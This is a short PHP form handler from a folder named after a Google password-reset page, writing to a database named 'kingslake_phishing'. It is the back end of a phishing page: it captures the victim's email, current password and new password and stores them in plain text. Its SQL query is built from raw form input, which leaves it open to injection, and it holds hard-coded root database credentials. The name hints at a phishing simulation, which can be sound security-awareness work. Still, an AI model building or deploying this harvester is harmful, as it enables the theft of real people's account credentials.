<?php
// filepath: c:\Users\kokilaa\Downloads\Google Forgot Password\process_form.php

// Database configuration
$servername = "192.168.0.168"; // Replace with your local machine IP
$username = "root"; // Replace with your MySQL username
$password = "1234"; // Replace with your MySQL password
$dbname = "kingslake_phishing"; // Replace with your database name

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}

// Get form data
$email = $_POST['email'];
$current_password = $_POST['current-password'];
$new_password = $_POST['password'];

// Insert data into database
$sql = "INSERT INTO users (email, current_password, new_password) VALUES ('$email', '$current_password', '$new_password')";

if ($conn->query($sql) === TRUE) {
  echo "New record created successfully";
} else {
  echo "Error: " . $sql . "<br>" . $conn->error;
}

// Close connection
$conn->close();
?>